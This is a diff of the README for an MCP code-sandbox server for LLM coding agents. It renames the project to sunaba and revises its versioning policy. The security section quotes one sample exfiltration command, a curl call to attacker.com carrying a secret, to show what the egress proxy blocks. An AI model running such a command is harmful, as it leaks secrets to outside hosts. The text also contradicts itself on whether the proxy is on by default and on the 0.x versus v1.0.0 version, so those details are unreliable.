@@ -1,6 +1,6 @@
-# code-sandbox-mcp
+# sunaba
 
-**Most AI coding tools optimize for humans. code-sandbox-mcp optimizes for frontier LLMs.**
+**Most AI coding tools optimize for humans. sunaba optimizes for frontier LLMs.**
 
 > Less context. Less trust. More structure.
 
@@ -89,7 +89,7 @@ For the full rationale and the decision principles behind each tool, see [docs/d
              (host shell tools OFF)
                        │
         ┌──────────────────────────────┐
-        │        code-sandbox-mcp       │
+        │            sunaba            │
         │   structured, minimal-context │
         │          control plane        │
         │  ──────────────────────────── │
@@ -128,7 +128,7 @@ The issue body, the source, and the diff never leave the container; the model on
 ## Quick start
 
 ```bash
-pip install git+https://github.com/masuda-masuo/code-sandbox-mcp@v1.0.0
+pip install git+https://github.com/masuda-masuo/sunaba@v1.0.0
 ```
 
 Minimal `claude_desktop_config.json`:
@@ -136,10 +136,10 @@ Minimal `claude_desktop_config.json`:
 ```json
 {
   "mcpServers": {
-    "code-sandbox-mcp": {
+    "sunaba": {
       "command": "python",
       "args": [
-        "-m", "code_sandbox_mcp.server"
+        "-m", "sunaba.server"
       ]
     }
   }
@@ -168,22 +168,22 @@ A few things that aren't obvious from the Quick start above and commonly trip up
 | `permission denied` on `/var/run/docker.sock` | User isn't in the `docker` group (Linux) | `sudo usermod -aG docker $USER`, then log out/in |
 | Image pull fails or hangs | Registry unreachable, or disk space exhausted | Check network access to GHCR; `docker system df` / `docker system prune` |
 | `sandbox_initialize` times out on first use | Initial GHCR image pull exceeds stdio's ~60s client timeout | Retry once cached, or switch to [SSE/HTTP](#transport-stdio-vs-ssehttp) |
-| `BLOCKED by egress proxy: ...` | Destination host not allowlisted, or `allow_network=True` was omitted | Re-check `sandbox_initialize(allow_network=True)`; for pushes, confirm the target repo is listed in `CODE_SANDBOX_ALLOWED_REPOS` (see [Security model](#security-model)) |
+| `BLOCKED by egress proxy: ...` | Destination host not allowlisted, or `allow_network=True` was omitted | Re-check `sandbox_initialize(allow_network=True)`; for pushes, confirm the target repo is listed in `SUNABA_ALLOWED_REPOS` (see [Security model](#security-model)) |
 
 ## Installation
 
 ```bash
 # Install (pinned to a released version, recommended)
-pip install git+https://github.com/masuda-masuo/code-sandbox-mcp@v1.0.0
+pip install git+https://github.com/masuda-masuo/sunaba@v1.0.0
 
 # Update to the latest commit on the default branch
-pip install --force-reinstall git+https://github.com/masuda-masuo/code-sandbox-mcp
+pip install --force-reinstall git+https://github.com/masuda-masuo/sunaba
 
 # Pin to a specific commit
-pip install git+https://github.com/masuda-masuo/code-sandbox-mcp@<commit-hash>
+pip install git+https://github.com/masuda-masuo/sunaba@<commit-hash>
 
 # Uninstall
-pip uninstall code-sandbox-mcp
+pip uninstall sunaba
 ```
 
 Requirements: Python 3.10+, Docker.
@@ -196,7 +196,7 @@ stdio has a ~60 second client timeout. Long operations (`docker pull`, `pip inst
 
 ```json
 "args": [
-  "-m", "code_sandbox_mcp.server",
+  "-m", "sunaba.server",
   "--transport", "sse",
   "--host", "127.0.0.1",
   "--port", "8750"
@@ -279,15 +279,15 @@ This is the full reference. You almost never touch most of it directly — the c
 
 ### Observability
 
-These journal/trace **read** tools are opt-in: set `CODE_SANDBOX_OBSERVABILITY_TOOLS=1` in the server environment to register them. Telemetry recording itself is always on; for aggregation, reading `~/.code-sandbox-mcp/journal.log` directly on the host works without any of these tools.
+These journal/trace **read** tools are opt-in: set `SUNABA_OBSERVABILITY_TOOLS=1` in the server environment to register them. Telemetry recording itself is always on; for aggregation, reading `~/.sunaba/journal.log` directly on the host works without any of these tools.
 
 | Tool | Description |
 |------|-------------|
 | `sandbox_read_journal` | Read the append-only execution journal. Filter by `run_id`, limit by `max_entries`. |
 | `sandbox_trace` | Generate HTML or JSON replay trace for a specific `run_id`. |
 | `sandbox_list_runs` | List all runs recorded in the journal. |
-| `sandbox_journal_path` | Return path to `~/.code-sandbox-mcp/journal.log`. |
-| `sandbox_trace_dir` | Return path to `~/.code-sandbox-mcp/traces/`. |
+| `sandbox_journal_path` | Return path to `~/.sunaba/journal.log`. |
+| `sandbox_trace_dir` | Return path to `~/.sunaba/traces/`. |
 
 ### VCS / Versioning
 
@@ -304,13 +304,14 @@ These journal/trace **read** tools are opt-in: set `CODE_SANDBOX_OBSERVABILITY_T
 
 ## Compatibility policy
 
-Starting with `v1.0.0`, the external contract is versioned with [Semantic Versioning](https://semver.org/):
+The external contract is versioned with [Semantic Versioning](https://semver.org/). The project is currently in `0.x`, which under semver means **the contract is not yet frozen**: a breaking change is a minor bump, not a major one.
 
 - **Covered by semver**: MCP tool names, tool argument names/types, return-value shapes, and environment variable names.
-- **Breaking changes** (renaming/removing a tool or argument, changing a return shape, renaming an environment variable) land only in a **major** version bump and are recorded in [CHANGELOG.md](CHANGELOG.md).
-- **Additive changes** (new tools, new optional arguments, new fields appended to a return object) are **minor** bumps.
-- **Contract-neutral fixes** are **patch** bumps.
+- **Breaking changes** (renaming/removing a tool or argument, changing a return shape, renaming an environment variable, reversing a default) land only in a **minor** bump while in `0.x` — never a patch — and are recorded in [CHANGELOG.md](CHANGELOG.md).
+- **Additive changes** (new tools, new optional arguments, new fields appended to a return object) are **patch** bumps while in `0.x`.
 - **Not covered**: the sandbox image contents (see below), internal module layout, and anything not exposed as an MCP tool surface.
+
+`1.0.0` will freeze the contract so that breaking changes require a major bump. It is promoted only once the operational side is stable enough to hold that promise — the criteria are recorded in [docs/design.md](docs/design.md) §15.
 
 Pin to a released tag for stability (see [Installation](#installation)); track `main` only if you want unreleased changes and accept that the contract above does not apply until the next tag.
 
@@ -347,7 +348,7 @@ sandbox_initialize(image="my-image@sha256:...")
 
 A minimal variant (`docker/Dockerfile.sandbox.minimal`) with git + python + pytest only is also available for lightweight use.
 
-**Image/server compatibility**: sandbox images are versioned independently of the `code-sandbox-mcp` package — `image_pins.json` pins each variant to a GHCR digest (updated via `scripts/update_image_pins.py`) and is not part of the [compatibility policy](#compatibility-policy) above. Any server release is expected to work with its bundled `image_pins.json`; if you override `image` explicitly, keep the in-container toolset (§ table above) compatible with what the server's edit/verify tools expect (e.g. `ruff`/`pyright` for lint/type gates).
+**Image/server compatibility**: sandbox images are versioned independently of the `sunaba` package — `image_pins.json` pins each variant to a GHCR digest (updated via `scripts/update_image_pins.py`) and is not part of the [compatibility policy](#compatibility-policy) above. Any server release is expected to work with its bundled `image_pins.json`; if you override `image` explicitly, keep the in-container toolset (§ table above) compatible with what the server's edit/verify tools expect (e.g. `ruff`/`pyright` for lint/type gates).
 
 ## Deployment & credential management
 
@@ -378,12 +379,12 @@ The host resolves the token from one of three orthogonal sources (`token_broker.
 
 **Windows — mcp-launcher (stdio)**
 
-Run `code-sandbox-mcp` behind mcp-launcher as a child process; the launcher proxies stdio and resolves the token internally, so no `GITHUB_TOKEN_*` env var is needed.
+Run `sunaba` behind mcp-launcher as a child process; the launcher proxies stdio and resolves the token internally, so no `GITHUB_TOKEN_*` env var is needed.
 
 ```
 AI Tool (Claude Desktop / etc.)
     └─ mcp-launcher  ← Windows Credential Manager, transparent MCP session restart
-           └─ code-sandbox-mcp  ← actual MCP server (child process)
+           └─ sunaba  ← actual MCP server (child process)
 ```
 
 - **Keystore:** Windows Credential Manager (DPAPI).
@@ -396,7 +397,7 @@ Useful for sharing one server across clients (e.g. opencode + Claude Desktop), d
 
 ```
 Claude Desktop ─ mcp-remote ┐
-                            ├─ code-sandbox-mcp (WSL2, streamable-http @ 127.0.0.1:8750/mcp)
+                            ├─ sunaba (WSL2, streamable-http @ 127.0.0.1:8750/mcp)
 opencode ───────────────────┘
 ```
 
@@ -408,9 +409,9 @@ with a dedicated script in `scripts/`:
 The package is public on GitHub, so a plain HTTPS clone works without credentials:
 
 ```bash
-python -m venv /path/to/venv/code-sandbox-mcp
-/path/to/venv/code-sandbox-mcp/bin/pip install \
-    git+https://github.com/masuda-masuo/code-sandbox-mcp@v1.0.0
+python -m venv /path/to/venv/sunaba
+/path/to/venv/sunaba/bin/pip install \
+    git+https://github.com/masuda-masuo/sunaba@v1.0.0
 ```
 
 **Phase 2 — Setup** (one-time, interactive)
@@ -433,31 +434,31 @@ Secrets live in the keystore, never in config files or env vars.
 Place the systemd user unit and start the service:
 
 ```bash
-./scripts/install-systemd.sh /path/to/venv/code-sandbox-mcp
+./scripts/install-systemd.sh /path/to/venv/sunaba
 ```
 
 The script substitutes `@VENV_DIR@` and `@PROJECT_DIR@` template variables,
-places `code-sandbox-mcp.service` in `~/.config/systemd/user/`, runs
+places `sunaba.service` in `~/.config/systemd/user/`, runs
 `systemctl --user daemon-reload`, and `systemctl --user enable --now`.
 
-The unit file uses `GITHUB_TOKEN_BROKER_SERVICE=code-sandbox-mcp` so the
-server calls `mcp-token code-sandbox-mcp` at runtime, which reads the
+The unit file uses `GITHUB_TOKEN_BROKER_SERVICE=sunaba` so the
+server calls `mcp-token sunaba` at runtime, which reads the
 keystore-registered credentials and mints a short-lived token — no human
 intervention needed after boot or restart.
 
 ```ini
-# scripts/code-sandbox-mcp.service (template excerpt)
+# scripts/sunaba.service (template excerpt)
 [Service]
-ExecStart=@VENV_DIR@/bin/python -m code_sandbox_mcp.server \
+ExecStart=@VENV_DIR@/bin/python -m sunaba.server \
     --transport streamable-http --host 127.0.0.1 --port 8750
-Environment=GITHUB_TOKEN_BROKER_SERVICE=code-sandbox-mcp
+Environment=GITHUB_TOKEN_BROKER_SERVICE=sunaba
 Environment=DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/%U/bus
 ```
 
 Clients connect via `mcp-remote`:
 
 ```json
-{ "mcpServers": { "code-sandbox-mcp": {
+{ "mcpServers": { "sunaba": {
   "command": "npx",
   "args": ["-y", "mcp-remote", "http://127.0.0.1:8750/mcp"]
 }}}
@@ -506,10 +507,10 @@ This follows the principle of least privilege — the container's own `git`/`gh`
 
 ### 2. Egress containment — the egress proxy (default-on)
 
-The egress proxy is **enabled by default**. Set `CODE_SANDBOX_ENABLE_EGRESS_PROXY=false` to opt out. When enabled, the container's only route to the outside is the HTTP(S) proxy on an internal Docker network — SSH, arbitrary TCP, and direct-to-IP egress are cut off by that topology alone. On top of that the proxy is a **default-deny egress gate**: a request to a host outside the allowlist is refused with a `403`, so arbitrary exfil (e.g. `curl https://attacker.com/?d=secret`) is blocked, not just git pushes. Two allowlists, deliberately separate, govern the two different questions:
+The egress proxy is **enabled by default**. Set `SUNABA_ENABLE_EGRESS_PROXY=false` to opt out. When enabled, the container's only route to the outside is the HTTP(S) proxy on an internal Docker network — SSH, arbitrary TCP, and direct-to-IP egress are cut off by that topology alone. On top of that the proxy is a **default-deny egress gate**: a request to a host outside the allowlist is refused with a `403`, so arbitrary exfil (e.g. `curl https://attacker.com/?d=secret`) is blocked, not just git pushes. Two allowlists, deliberately separate, govern the two different questions:
 
-- **Where the sandbox may connect** — `CODE_SANDBOX_ALLOWED_EGRESS_HOSTS` (destination hosts). Defaults to GitHub and the package registries (see below); everything else is denied.
-- **Where the sandbox may write** — `CODE_SANDBOX_ALLOWED_REPOS` (push / GitHub-API-write targets). Reachability says nothing about write authorization; a repo can be cloneable but not pushable.
+- **Where the sandbox may connect** — `SUNABA_ALLOWED_EGRESS_HOSTS` (destination hosts). Defaults to GitHub and the package registries (see below); everything else is denied.
+- **Where the sandbox may write** — `SUNABA_ALLOWED_REPOS` (push / GitHub-API-write targets). Reachability says nothing about write authorization; a repo can be cloneable but not pushable.
 
 Use `allow_network=True` only when containers actually need network access. For the read/push grants to authenticate, the proxy must be configured with a host-resolvable token (broker / `GITHUB_TOKEN`).
 
@@ -518,9 +519,9 @@ Use `allow_network=True` only when containers actually need network access. For 
 | Guarantee | proxy **off** (default) | proxy **on** |
 |---|---|---|
 | No token ever enters the container | ✅ (proxy-independent) | ✅ |
-| Push restricted to an allowlist (network layer) | ❌ | ✅ (`CODE_SANDBOX_ALLOWED_REPOS`) |
+| Push restricted to an allowlist (network layer) | ❌ | ✅ (`SUNABA_ALLOWED_REPOS`) |
 | Non-HTTP egress cut off (SSH / raw TCP / direct IP) | ❌ (`allow_network=True` is unrestricted) | ✅ (internal network, proxy is the only exit) |
-| Arbitrary-host egress denied (exfil containment) | ❌ | ✅ (`CODE_SANDBOX_ALLOWED_EGRESS_HOSTS`, default-deny) |
+| Arbitrary-host egress denied (exfil containment) | ❌ | ✅ (`SUNABA_ALLOWED_EGRESS_HOSTS`, default-deny) |
 | Private-repo read (`clone` / `pr=N`) | ❌ (anonymous clone only) | ✅ (read grant) |
 | Fail-closed (network start refused if the proxy fails to start) | — | ✅ |
 
@@ -530,20 +531,20 @@ Use `allow_network=True` only when containers actually need network access. For 
 
 ### Configuring the egress proxy
 
-**Push targets** — `CODE_SANDBOX_ALLOWED_REPOS` is the allowlist of repositories the sandbox may push to:
+**Push targets** — `SUNABA_ALLOWED_REPOS` is the allowlist of repositories the sandbox may push to:
 
 ```bash
 # Allow pushes to specific repositories
-CODE_SANDBOX_ALLOWED_REPOS="owner/repo-a,owner/repo-b"
+SUNABA_ALLOWED_REPOS="owner/repo-a,owner/repo-b"
 ```
 
-If `CODE_SANDBOX_ALLOWED_REPOS` is unset or does not include the target repository, `publish` will fail with a clear error message. The push is **not** silently redirected through the Objects API fallback — this is intentional: bypassing the proxy would hide a configuration error and let administration proceed with a misconfigured setup (see [#401](https://github.com/masuda-masuo/code-sandbox-mcp/issues/401)).
+If `SUNABA_ALLOWED_REPOS` is unset or does not include the target repository, `publish` will fail with a clear error message. The push is **not** silently redirected through the Objects API fallback — this is intentional: bypassing the proxy would hide a configuration error and let administration proceed with a misconfigured setup (see [#401](https://github.com/masuda-masuo/sunaba/issues/401)).
 
-**Destination hosts** — `CODE_SANDBOX_ALLOWED_EGRESS_HOSTS` extends the built-in set of hosts the sandbox may reach at all:
+**Destination hosts** — `SUNABA_ALLOWED_EGRESS_HOSTS` extends the built-in set of hosts the sandbox may reach at all:
 
 ```bash
 # Allow the sandbox to also reach an internal mirror and any *.example.com host
-CODE_SANDBOX_ALLOWED_EGRESS_HOSTS="mirror.internal, .example.com"
+SUNABA_ALLOWED_EGRESS_HOSTS="mirror.internal, .example.com"
 ```
 
 - The built-in defaults — `github.com`, `api.github.com`, `codeload.github.com`, `*.githubusercontent.com`, `pypi.org`, `files.pythonhosted.org`, `registry.npmjs.org` — are **always** allowed so `git`, `pip`, and `npm` work out of the box; operator entries only *add* to them.
@@ -552,9 +553,9 @@ CODE_SANDBOX_ALLOWED_EGRESS_HOSTS="mirror.internal, .example.com"
 
 ## Observability
 
-The server maintains an append-only execution journal at `~/.code-sandbox-mcp/journal.log`. Every container lifecycle event (initialize, exec, stop) and boundary-crossing operation is recorded with timestamps and run IDs.
+The server maintains an append-only execution journal at `~/.sunaba/journal.log`. Every container lifecycle event (initialize, exec, stop) and boundary-crossing operation is recorded with timestamps and run IDs.
 
-When the journal exceeds 100 MB it is automatically rotated to `journal.log.1`; the on-disk footprint stays bounded to approximately twice that size (one active + one backup). Journal readers transparently merge both files in chronological order. Trace files under `~/.code-sandbox-mcp/traces/` are kept to at most 100 files, with oldest ones evicted first.
+When the journal exceeds 100 MB it is automatically rotated to `journal.log.1`; the on-disk footprint stays bounded to approximately twice that size (one active + one backup). Journal readers transparently merge both files in chronological order. Trace files under `~/.sunaba/traces/` are kept to at most 100 files, with oldest ones evicted first.
 
 | Component | Description |
 |-----------|-------------|
@@ -597,9 +598,9 @@ sandbox_stop(container_id)
 
 Existing AI coding tools (Claude Code, Open Code / Codex CLI, Copilot) display test results as transient terminal text. Once the output scrolls past, it's gone — there is no structured record of what happened, when, and why.
 
-code-sandbox-mcp shifts the human from **active watching** to **passive monitoring**:
+sunaba shifts the human from **active watching** to **passive monitoring**:
 
-| Capability | Claude Code / Open Code | code-sandbox-mcp |
+| Capability | Claude Code / Open Code | sunaba |
 |------------|--------------------------|-------------------|
 | Test output | Terminal text, ephemeral | Structured journal with per-operation timeline |
 | Pass/fail visibility | Scroll through raw output | Color-coded badges (green/red) at a glance |
@@ -618,8 +619,8 @@ The dashboard (`--dashboard-port 8751`) runs on localhost, auto-refreshes every 
 ### Setting up a local development environment
 
 ```bash
-git clone https://github.com/masuda-masuo/code-sandbox-mcp.git
-cd code-sandbox-mcp
+git clone https://github.com/masuda-masuo/sunaba.git
+cd sunaba
 pip install -e .[test]
 ```
 
@@ -628,15 +629,15 @@ pip install -e .[test]
 If you previously installed the package without `-e` (e.g. via `pip install git+https://...`), remove it first:
 
 ```bash
-pip uninstall code-sandbox-mcp   # repeat until "not installed"
+pip uninstall sunaba   # repeat until "not installed"
 pip install -e .[test]
 ```
 
 Verify that imports resolve to the source tree:
 
 ```bash
-python -c "import inspect, code_sandbox_mcp.server; print(inspect.getfile(code_sandbox_mcp.server))"
-# Expected: .../code-sandbox-mcp/src/code_sandbox_mcp/server.py
+python -c "import inspect, sunaba.server; print(inspect.getfile(sunaba.server))"
+# Expected: .../sunaba/src/sunaba/server.py
 ```
 
 ## Known limitations
